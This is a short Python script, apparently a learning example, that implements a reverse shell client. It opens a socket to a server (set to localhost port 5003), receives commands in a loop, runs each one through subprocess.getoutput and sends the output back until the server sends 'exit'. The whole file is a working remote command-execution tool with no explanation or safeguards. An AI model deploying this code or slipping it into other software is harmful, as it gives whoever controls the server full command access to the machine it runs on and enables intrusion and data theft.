import socket
import subprocess


class Client:

    def __init__(self, server_host, server_port, buffer_size):
        self.server_host = server_host
        self.server_port = server_port
        self.buffer_size = buffer_size
        self.socket = socket.socket()

    def connect(self):
        self.socket.connect((self.server_host, self.server_port))

    def receive(self):
        while True:
            command = self.socket.recv(self.buffer_size).decode()
            if command.lower() == "exit":
                break
            output = subprocess.getoutput(command)
            self.socket.send(output.encode())
        self.socket.close()



if __name__ == '__main__':
    client = Client("localhost", 5003, 1024)
    client.connect()
    client.receive()